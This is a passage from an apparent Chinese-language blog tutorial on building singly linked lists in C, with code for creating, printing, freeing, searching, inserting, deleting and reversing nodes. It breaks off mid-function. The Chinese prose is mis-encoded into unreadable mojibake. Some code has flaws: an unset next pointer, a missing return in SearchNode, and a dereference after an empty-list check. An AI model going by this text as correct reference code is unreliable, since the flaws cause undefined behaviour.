ç”¨ä¾†æŒ‡å‘éˆçµç›®å‰æ‰€åœ¨ç¯€é»ï¼Œé€šå¸¸å† traverse link çš„æ™‚å€™å¾ˆå¸¸ç”¨</li><li><code>previous_node</code> ç”¨ä¾†æŒ‡å‘current_node çš„å‰ä¸€å€‹ç¯€é»ï¼Œåœ¨å»ºç«‹ç¯€é»æˆ–è€…åè½‰æ•´å€‹linked list çš„æ™‚å€™å¾ˆå¸¸ç”¨</li></ul><p>ç¾åœ¨å¯ä»¥é–‹å§‹å¾0 å»ºç«‹éˆçµã€‚</p><h2 id="å»ºç«‹-Linked-List"><a href="#å»ºç«‹-Linked-List" class="headerlink" title="å»ºç«‹ Linked List"></a>å»ºç«‹ Linked List</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">  <span class="type">int</span> node_numbers;</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;node_numbers);</span><br><span class="line">  create_new_node(node_numbers);</span><br><span class="line">  current_node = first_node;</span><br><span class="line">  <span class="keyword">while</span> (current_node!= <span class="literal">NULL</span>)&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[%p]|&quot;</span>,current_node);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Data: %d&quot;</span>,current_node-&gt;data);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;| Addr. of next node=%p \n&quot;</span>,current_node-&gt;next);</span><br><span class="line">    current_node=current_node-&gt;next;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨ä¸Šé¢çš„ç¨‹å¼ç¢¼ä¸­ï¼Œæˆ‘å€‘é¦–å…ˆæä¾›è¼¸å…¥ä¾†æ±ºå®šè¦å»ºç«‹çš„ç¯€é»æ•¸é‡ï¼Œæ¥è‘—å‘¼å« <code>create_new_node</code> å‡½å¼ï¼Œä¸¦ä¸”å¾ç¬¬ä¸€å€‹ç¯€é»ä¾åºå°å‡ºç¯€é»è³‡æ–™å’Œä¸‹ä¸€å€‹ç¯€é»çš„ä½å€ï¼Œæœ€å¾Œé€é <code>current_node=current_node-&gt;next;</code> ä¾†ç§»å‹•åˆ°ä¸‹ä¸€å€‹ç¯€é»ã€‚</p><p>é€™è£¡æœ€éœ€è¦åšçš„å°±æ˜¯è¦å»ºç«‹ <code>create_new_node</code> å‡½å¼</p><h2 id="å»ºç«‹ç¯€é»-Create-new-node"><a href="#å»ºç«‹ç¯€é»-Create-new-node" class="headerlink" title="å»ºç«‹ç¯€é» (Create_new_node)"></a>å»ºç«‹ç¯€é» (<code>Create_new_node</code>)</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">create_new_node</span><span class="params">(<span class="type">int</span> node_nums)</span>&#123;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>; i&lt; node_nums; i++)&#123;</span><br><span class="line">        <span class="comment">// Declare new node</span></span><br><span class="line">        current_node = (Node*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Node));</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Data for node %d : &quot;</span>,i+<span class="number">1</span>);</span><br><span class="line">        <span class="comment">// Enter node data</span></span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;(current_node-&gt;data));</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// First node, don&#x27;t have previous node, so let the first_node and previous_node equal to current_node</span></span><br><span class="line">        <span class="keyword">if</span>(i==<span class="number">0</span>)&#123;</span><br><span class="line">            first_node = current_node;</span><br><span class="line">            previous_node = current_node;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="comment">// Set the previous node point to the current node</span></span><br><span class="line">            previous_node-&gt;next = current_node;</span><br><span class="line">            current_node-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">            <span class="comment">// Set the previous node to current node, prepare to next node creation (or not)</span></span><br><span class="line">            previous_node = current_node;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>åœ¨å‡½å¼å…§ï¼Œé€é <code>for loop</code> ä¾†é‡è¤‡ç¯€é»çš„å»ºç«‹</li><li>é€é malloc å‹•æ…‹åˆ†é…å…·æœ‰ <code>Node</code> å¤§å°ç©ºé–“ï¼Œä¸¦å°‡ current_node æŒ‡å‘å…¶è¨˜æ†¶é«”ä½å€</li><li>è®“ä½¿ç”¨è€…æ‰‹å‹•è¼¸å…¥ data å…§å®¹</li><li><code>current_node -&gt; data</code> ä»£è¡¨å­˜å–é€™å€‹è¨˜æ†¶é«”ä½å€çš„ data è®Šæ•¸ï¼Œé€™è£¡ä¹Ÿæ˜¯ç›´æ¥å°‡æ‰‹å‹•è¼¸å…¥çš„è³‡æ–™å€¼å­˜æ”¾åˆ°ç¯€é»ä¸­çš„dataè®Šæ•¸ä¸­</li><li>æ¥è‘—å°±æ˜¯åˆ¤æ–·æ˜¯å¦æ˜¯å»ºç«‹ç¬¬ä¸€å€‹ç¯€é»ï¼Œç•¶å»ºç«‹ç¬¬ä¸€å€‹ç¯€é»çš„æ™‚å€™ï¼Œè¨˜å¾—è¦æ›´æ–° <code>first_node</code> é€™å€‹æŒ‡æ¨™ï¼Œç¢ºä¿æŒ‡åˆ°ç•¶å‰ç¯€é»ï¼Œä¸¦ä¸”é€™æ™‚å€™ä¹Ÿæ²’æœ‰å‰ä¸€å€‹ç¯€é»ï¼Œå› æ­¤ä¹Ÿå°‡ <code>previous_node</code> æ›´æ–°ç‚º <code>current_node</code> ä¹Ÿå°±æ˜¯ç›®å‰ç¯€é»</li><li>å¦‚æœé–‹å§‹å»ºç«‹å¾ŒçºŒçš„ç¯€é»ï¼Œå‰‡è¦è®“å‰ä¸€å€‹ç¯€é»æŒ‡å‘åˆ°ç›®å‰ç¯€é»çš„è¨˜æ†¶é«”ä½å€ï¼Œæ‰èƒ½å¤ éˆçµèµ·ä¾†ï¼Œæ‰€ä»¥ <code>previous_node-&gt;next = current_node;</code></li><li>ä¸¦ä¸”å°‡ <code>current_node</code> çš„ä¸‹ä¸€å€‹ç¯€é»è¨˜æ†¶é«”ä½å€æŒ‡å‘ NULLï¼Œæ‰€ä»¥ <code>current_node -&gt; next = NULL;</code></li><li>æœ€å¾Œé‚„éœ€è¦æ›´æ–° <code>previous_node</code> ç‚ºç•¶å‰ç¯€é»</li></ul><h2 id="å°å‡ºç¯€é»-PrintList"><a href="#å°å‡ºç¯€é»-PrintList" class="headerlink" title="å°å‡ºç¯€é» (PrintList)"></a>å°å‡ºç¯€é» (<code>PrintList</code>)</h2><p>åœ¨å»ºç«‹å®Œç¯€é»ï¼Œé›£å…æƒ³è¦å°å‡ºæ•´å€‹ä¸²åˆ—</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// input parameter is node struct</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">PrintList</span><span class="params">(Node* first)</span>&#123;</span><br><span class="line">    <span class="comment">// Decalre the address of input node</span></span><br><span class="line">    Node *node = first;</span><br><span class="line">    <span class="keyword">if</span> (first == <span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;List is empty!\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">while</span>( node != <span class="literal">NULL</span>)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d -&gt; &quot;</span>, node-&gt;data);</span><br><span class="line">            node = node-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span> (<span class="string">&quot;Null \n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>ä¸»è¦é‚è¼¯å°±æ˜¯è®“å¾ first node é †è‘—éˆçµä¸€ç›´å¾€ä¸‹è·‘ï¼Œæ‰€ä»¥å°‡ <code>node = node -&gt; next</code> ç›´åˆ°é‡åˆ° Null</li><li>å‡½å¼çš„è¼¸å…¥æœƒå¼åˆå§‹ç¯€é»ä½å€</li><li>éœ€è¦åˆ¤æ–·listæ˜¯å¦ç‚ºç©º</li></ul><p>æ¥è‘—åœ¨ main å‡½å¼å‘¼å«å³å¯å°å‡º</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PrintList(first_node);</span><br></pre></td></tr></table></figure><h2 id="é‡‹æ”¾è¨˜æ†¶é«”"><a href="#é‡‹æ”¾è¨˜æ†¶é«”" class="headerlink" title="é‡‹æ”¾è¨˜æ†¶é«”"></a>é‡‹æ”¾è¨˜æ†¶é«”</h2><p>ç”±æ–¼æ¯å€‹ç¯€é»éƒ½æ˜¯é€é <strong>malloc</strong> é€²è¡Œå‹•æ…‹å®£å‘Šçš„ï¼Œå¼•æ­¤å ç”¨çš„è¨˜æ†¶é«”ä½å€åœ¨åŸ·è¡ŒçµæŸå¾Œè¦é€²è¡Œé‡‹æ”¾ï¼Œå› æ­¤ä¸€æ¨£éœ€è¦æª¢ç´¢æ¯å€‹éˆçµç¯€é»å»é€²è¡Œ <code>free()</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">FreeList</span><span class="params">(Node* first)</span>&#123;</span><br><span class="line">    Node *current, *temp_node;</span><br><span class="line">    current = first;</span><br><span class="line">    <span class="keyword">while</span> ( current != <span class="literal">NULL</span> )&#123;</span><br><span class="line">        <span class="comment">// Put the node that wants to be removed into temp_node</span></span><br><span class="line">        temp_node = current;</span><br><span class="line">        <span class="comment">// Let the current node point to the next node</span></span><br><span class="line">        current = current-&gt;next;</span><br><span class="line">        <span class="comment">// Free the node</span></span><br><span class="line">        <span class="built_in">free</span>(temp_node);   </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>å‡½å¼å‚³å…¥åƒæ•¸ä¸€æ¨£æœƒæ˜¯åˆå§‹ç¯€é»çš„ä½å€</li><li>ä¸€æ—¦å°šæœªåˆ° NULL çš„æ™‚å€™æœƒéœ€è¦å°‡ ç•¶å‰ç¯€é»ä¸Ÿåˆ°ä¸€å€‹æš«å­˜çš„è¨˜æ†¶é«”ä½å€å»é€²è¡Œ <code>free()</code>ï¼Œå¦‚æœç›´æ¥ <code>free(current)</code> å‰‡æ‰€å­˜æ”¾çš„ä¸‹ä¸€å€‹ç¯€é»çš„è¨˜æ†¶é«”ä½å€å°±æ‰¾ä¸åˆ°äº†</li><li>æ¥è‘—åœ¨è®“ç•¶å‰ç¯€é»ç¹¼çºŒè‘— list å¾€ä¸‹èµ° <code>current = current-&gt;next;</code></li></ul><h2 id="æŸ¥æ‰¾ç¯€é»"><a href="#æŸ¥æ‰¾ç¯€é»" class="headerlink" title="æŸ¥æ‰¾ç¯€é»"></a>æŸ¥æ‰¾ç¯€é»</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Return value should be the address of the node</span></span><br><span class="line">Node* <span class="title function_">SearchNode</span><span class="params">(Node* first, <span class="type">int</span> item)</span>&#123;</span><br><span class="line">    Node * node = first;</span><br><span class="line">    <span class="keyword">while</span> ( node != <span class="literal">NULL</span>)&#123; </span><br><span class="line">        <span class="keyword">if</span> (node-&gt;data == item)&#123;</span><br><span class="line">            <span class="keyword">return</span> node;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            node = node-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>é€™è£¡å‡½æ•¸çš„å®£å‘Šå‹åˆ¥ä¹Ÿæ˜¯ç”¨ <code>Node* </code> å› ç‚ºå›å‚³å€¼æœƒæ˜¯ä¸€å€‹çµæ§‹æŒ‡æ¨™ï¼Œä¹Ÿå°±æ˜¯ç¯€é»çš„è¨˜æ†¶é«”ä½å€</li><li>å‚³å…¥åƒæ•¸ä¹Ÿéœ€è¦å‚³è¼¸ list çš„åˆå§‹ç¯€é»ä½å€ï¼Œä»¥åŠæƒ³è¦æ‰¾çš„dataå€¼</li><li>ä¸€æ¨£é †è‘— Lists æ‰¾ (<code>node= node-&gt;next;</code>) å¦‚æœæœ‰æ‰¾åˆ°ç¯€é»çš„è³‡æ–™å€¼ç­‰æ–¼ <code>item</code> å°±å›å‚³ç¯€é»ï¼Œç›´åˆ°é‡åˆ° Null ç‚ºæ­¢</li></ul><h2 id="æ’å…¥ç¯€é»"><a href="#æ’å…¥ç¯€é»" class="headerlink" title="æ’å…¥ç¯€é»"></a>æ’å…¥ç¯€é»</h2><p>æ’å…¥ç¯€é»é€™é‚Šæ ¹æ“šä¸åŒç‹€æ³åˆ†æˆä¸åŒå‡½æ•¸è™•ç†:</p><ul><li>æ’å…¥åˆ° List ä¸­é–“</li><li>æ’å…¥åˆ° List çš„é ­</li><li>æ’å…¥åˆ° List çš„å°¾ç«¯</li></ul><h3 id="æ’ä¸­é–“"><a href="#æ’ä¸­é–“" class="headerlink" title="æ’ä¸­é–“"></a>æ’ä¸­é–“</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">InsertNode</span><span class="params">(Node* node, <span class="type">int</span> item)</span>&#123;</span><br><span class="line">    Node *new_node;</span><br><span class="line">    new_node = (Node*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Node));</span><br><span class="line">    <span class="comment">// Point the new node to the nexy item of original node</span></span><br><span class="line">    new_node-&gt;data = item;</span><br><span class="line">    new_node-&gt;next = node-&gt;next;</span><br><span class="line">    <span class="comment">// Point the original node to new node</span></span><br><span class="line">    node -&gt; next = new_node;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>å‡½æ•¸çš„å‚³å…¥åƒæ•¸æœƒæ˜¯ä¸€å€‹ nodeï¼Œä¸¦ä¸”é‚„éœ€è¦æä¾›æ’å…¥ç¯€é»çš„è³‡æ–™å€¼</li><li>æ¥è‘—å°±æ˜¯æ–°å»ºç«‹ä¸€å€‹ç¯€é»ï¼Œç‚ºå®ƒåˆ†é…è¨˜æ†¶é«”ç©ºé–“</li><li>å°‡æ–°ç¯€é»çš„ <code>data</code> è®Šæ•¸æ”¾å…¥ <code>item</code> é€™å€‹è³‡æ–™å€¼</li><li>å°‡æ–°çµé»çš„ <code>next</code> æ”¾å…¥åŸæœ¬è¼¸å…¥ç¯€é»çš„ä¸‹ä¸€å€‹ç¯€é»ä½å€</li><li>å°‡åŸæœ¬æ›¸å…¥ç¯€é»çš„ <code>next</code> æŒ‡å‘æˆ‘å€‘æ–°å»ºç«‹çš„ç¯€é»<br>é€™æ¨£å°±å®Œæˆæ’å…¥ç¯€é»çš„æ“ä½œäº†</li></ul><h3 id="æ’é ­"><a href="#æ’é ­" class="headerlink" title="æ’é ­"></a>æ’é ­</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Insert a node to the front of the list</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">push_front</span><span class="params">(<span class="type">int</span>  item)</span>&#123;</span><br><span class="line">    Node * new_node;</span><br><span class="line">    new_node = (Node*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Node));</span><br><span class="line">    new_node-&gt;data = item;</span><br><span class="line">    new_node-&gt;next = first_node; <span class="comment">// new node pointer point to original first node</span></span><br><span class="line">    first_node = new_node;  <span class="comment">// Update the first node to the new node</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>å› ç‚ºæ˜¯é ­ï¼Œæ‰€ä»¥è¼¸å…¥åƒæ•¸å°±ç›´æ¥çµ¦è³‡æ–™å€¼å°±å¥½</li><li>ä¸€æ¨£å»ºç«‹æ–°ç¯€é»ï¼Œä¸¦ç‚ºå…¶åˆ†é…è¨˜æ†¶é«”ç©ºé–“</li><li>å°‡ <code>item</code> æ”¾å…¥æ–°ç¯€é»çš„ <code>data</code></li><li>å°‡æ–°ç¯€é»çš„ <code>next</code> æŒ‡å‘åˆ°ç¬¬ä¸€å€‹ç¯€é»</li><li>æ›´æ–° <code>first_node</code> ç‚ºæ–°çš„ç¯€é»</li></ul><h3 id="æ’å°¾ç«¯"><a href="#æ’å°¾ç«¯" class="headerlink" title="æ’å°¾ç«¯"></a>æ’å°¾ç«¯</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Insert a node to the back of the list</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">push_back</span><span class="params">(<span class="type">int</span> item)</span>&#123;</span><br><span class="line">    Node * new_node;</span><br><span class="line">    new_node = (Node*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Node));</span><br><span class="line">    new_node-&gt;data = item;</span><br><span class="line">    new_node-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="comment">// Handle empty list</span></span><br><span class="line">    <span class="keyword">if</span> (first_node == <span class="literal">NULL</span>)&#123;</span><br><span class="line">        first_node = new_node;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="comment">// Initailize the current node to the first node for traversal</span></span><br><span class="line">        Node * current_node = first_node;</span><br><span class="line">        <span class="keyword">while</span> (current_node-&gt;next != <span class="literal">NULL</span>)&#123;</span><br><span class="line">            <span class="comment">// traverse through the list</span></span><br><span class="line">            current_node = current_node-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// Point to the new node</span></span><br><span class="line">        current_node-&gt;next = new_node;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>ä¸€æ¨£è¼¸å…¥åƒæ•¸æœƒæ˜¯æ–°ç¯€é»çš„è³‡æ–™å€¼</li><li>ä¸€æ¨£å»ºç«‹æ–°çš„ç¯€é»ï¼Œä¸¦ä¸”åˆ†é…è¨˜æ†¶é«”ç©ºé–“çµ¦ä»–</li><li>å°‡æ–°ç¯€é»çš„è³‡æ–™å€¼çµ¦äºˆ <code>item</code></li><li>å°‡æ–°ç¯€é»çš„æŒ‡æ¨™æŒ‡å‘ NULL</li><li>æ¥ä¸‹ä¾†å°±æ˜¯è™•ç†æ’å…¥ï¼Œä½†é€™æ¨£æœƒå…ˆé€²è¡Œä¸€å€‹ä¾‹å¤–è™•ç†ï¼Œå°±æ˜¯è¦å…ˆåˆ¤æ–· Listæ˜¯å¦ç‚ºç©ºï¼Œå¦‚æœæ˜¯ç©ºçš„å°±å°‡ <code>first_node</code> æ›´æ–°ç‚ºæˆ‘å€‘æ–°å»ºç«‹çš„ <code>new_node</code></li><li>è‹¥ list éç©ºï¼Œå‰‡éœ€è¦å…ˆ traverse æ•´å€‹ list æ‰¾åˆ°æœ€å¾Œä¸€å€‹ç¯€é»ï¼Œæ‰€ä»¥å°‡ <code>current_node</code> æ›´æ–°ç‚º <code>first_node</code></li><li>è‹¥å°šæœªæŠµé”æœ€å¾Œä¸€å€‹ç¯€é»ï¼Œå‰‡ç¹¼çºŒ traverse <code>current_node = current_node-&gt;next;</code></li><li>æŠµé”æœ€å¾Œç¯€é»å¾Œï¼Œå°‡æœ€å¾Œç¯€é»çš„æŒ‡æ¨™å€¼æŒ‡å‘æ–°å»ºç«‹çš„ç¯€é»</li></ul><h2 id="åˆªé™¤ç¯€é»"><a href="#åˆªé™¤ç¯€é»" class="headerlink" title="åˆªé™¤ç¯€é»"></a>åˆªé™¤ç¯€é»</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">Node* <span class="title function_">DeleteNode</span><span class="params">(Node* first ,Node* node)</span>&#123;</span><br><span class="line">    Node* ptr= first;</span><br><span class="line">    <span class="keyword">if</span> (first == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Noting to print\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// Delete first node of the list</span></span><br><span class="line">    <span class="keyword">if</span> (node == first)&#123;</span><br><span class="line">        <span class="comment">// Update the first pointer to the next node</span></span><br><span class="line">        first = first-&gt;next;</span><br><span class="line">        <span class="built_in">free</span>(node);</span><br><span class="line">        <span class="keyword">return</span> first;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="comment">// ptr traverse through the list</span></span><br><span class="line">        <span class="keyword">while</span> (ptr-&gt;next != node)</span><br><span class="line">        &#123;</span><br><span class="line">            ptr = ptr-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        ptr-&gt;next = node-&gt;next;</span><br><span class="line">        <span class="built_in">free</span>(node);</span><br><span class="line">        <span class="keyword">return</span> first;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>å‚³å…¥åƒæ•¸æœƒæœ‰ï¼Œåˆå§‹ç¯€é»ï¼Œä»¥åŠè¦è¢«åˆªé™¤çš„ç¯€é»</li><li>ä¸€é–‹å§‹ä¸€æ¨£æœƒéœ€è¦åˆ¤æ–· <code>first_node</code> æ˜¯å¦ç‚º nullï¼Œå¦‚æœæ˜¯ null ä¹Ÿæ²’æ±è¥¿çµ¦ä½ åˆª</li><li>æ¥è‘—ä¸€æ¨£æœƒåˆ†æˆä¸åŒæƒ…æ³è™•ç†ï¼Œåˆ†åˆ¥æ˜¯<ul><li>åˆªé™¤é ­</li><li>åˆªé™¤ä¸­é–“å’Œå°¾ç«¯</li></ul></li><li>åˆªé™¤é ­çš„è™•ç†æ–¹å¼æœƒæ˜¯å…ˆæ›´æ–° <code>first_node</code> æ›´æ–°ç‚ºå®ƒçš„ä¸‹ä¸€å€‹ç¯€é»</li><li>æ¥è‘—ç›´æ¥ä½¿ç”¨ <code>free()</code> é‡‹æ”¾è¨˜æ†¶é«”</li><li>å†ä¾†å°±æ˜¯ç•¶éˆçµé‚„æ²’æŠµé”è¦è¢«åˆªé™¤çš„ç¯€é»æ™‚ï¼Œç¹¼çºŒ traverse  (<code>ptr = ptr-&gt;next</code>)</li><li>ä¸€æ—¦æ‰¾åˆ°äº†å‰‡å°‡å®ƒçš„æŒ‡æ¨™ï¼Œå…ˆæŒ‡å‘ä¸‹ä¸€å€‹ç¯€é»çš„ä¸‹ä¸€å€‹ç¯€é»ä½å€</li><li>æ¥è‘—ç›´æ¥ä½¿ç”¨ <code>free()</code> é‡‹æ”¾è¨˜æ†¶é«”</li></ul><h2 id="åè½‰éˆçµä¸²åˆ—-Reverse-Linked-List"><a href="#åè½‰éˆçµä¸²åˆ—-Reverse-Linked-List" class="headerlink" title="åè½‰éˆçµä¸²åˆ— (Reverse Linked List)"></a>åè½‰éˆçµä¸²åˆ— (Reverse Linked List)</h2><p><img src="/img/LeetCode/Linked_List/reverse-1.png"></p><p>è¦åè½‰ä¸€å€‹é™£åˆ—ï¼Œæœƒéœ€è¦ä¸€å€‹é¡å¤–ç¯€é»ä¾†æš«æ™‚å­˜æ”¾ç¯€é»ä½å€ã€‚</p><h3 id="è§£é‡‹"><a href="#è§£é‡‹" class="headerlink" title="è§£é‡‹"></a>è§£é‡‹</h3><p>å¦‚æœé¦–å…ˆå°±æŠŠåˆå§‹ç¯€é» (Aç¯€é»)çš„æŒ‡æ¨™æŒ‡å‘ NULL æœƒæœ‰å€‹å•é¡Œï¼ŒåŸå…ˆçš„æŒ‡æ¨™å­˜æ”¾çš„æ˜¯ä¸‹ä¸€å€‹ç¯€é»çš„ä½å€ï¼Œ<strong>å¦‚æœæ”¹æˆ NULL ä¸å°±ä¸çŸ¥é“åŸå…ˆä¸‹ä¸€å€‹ç¯€é»çš„ä½å€äº†å—?</strong> é€£ç¯€é»ä½å€éƒ½æ²’æœ‰è¦æ€éº¼é€²è¡Œåè½‰?å› æ­¤æ‰éœ€è¦é¡å¤–çš„ç¯€é»æ‰æŒ‡å‘åˆ° B ç¯€é»ï¼Œä¾†å­˜æ”¾Bçš„è¨˜æ†¶é«”ä½å€ã€‚</p><p>å› æ­¤æ­¥é©Ÿå¦‚ä¸‹åœ–ï¼š</p><ol><li>å®šç¾©æŒ‡æ¨™æŒ‡å‘ NULL</li><li>å»ºç«‹æš«å­˜ç¯€é»ï¼ŒæŒ‡å‘åˆ°ç•¶å‰ç¯€é»çš„ä¸‹ä¸€å€‹ç¯€é»</li><li>å°‡ç•¶å‰ç¯€é»æ”¹æŒ‡å‘ NULL</li><li>å°‡ä¸‹ä¸€å€‹ç¯€é» (Bç¯€é»)æ”¹æŒ‡å‘ä¸Šä¸€å€‹ç¯€é» (Aç¯€é»)</li><li>æ›´æ–°æš«å­˜ç¯€é»çš„æŒ‡æ¨™ï¼ŒæŒ‡å‘å†ä¸‹ä¸€å€‹ç¯€é»çš„ä½å€<br><img src="/img/LeetCode/Linked_List/reverse-2.png"></li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">Reverse</span><span class="params">()</span>&#123;  </span><br><span class="line">    Node *current, *previous, *preceding;</span><br><span class="line">    previous = <span class="literal">NULL</span>;</span><br><span class="line">    current = first_node;</span><br><span class="line">    <span class="comment">// preceding node store the previous address of the current node</span></span><br><span class="line">    preceding = first_node-&gt;next;</span><br><span class="line">    <span class="keyword">while</span> (preceding != <span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="comment">// pointer the current node to the NULL (previous) node</span></span><br><span class="line">        current-&gt;next = previous;</span><br><span class="line">        <span class="comment">// Update previous poinert to current pointer</span></span><br><span class="line">        previous = current;</span><br><span 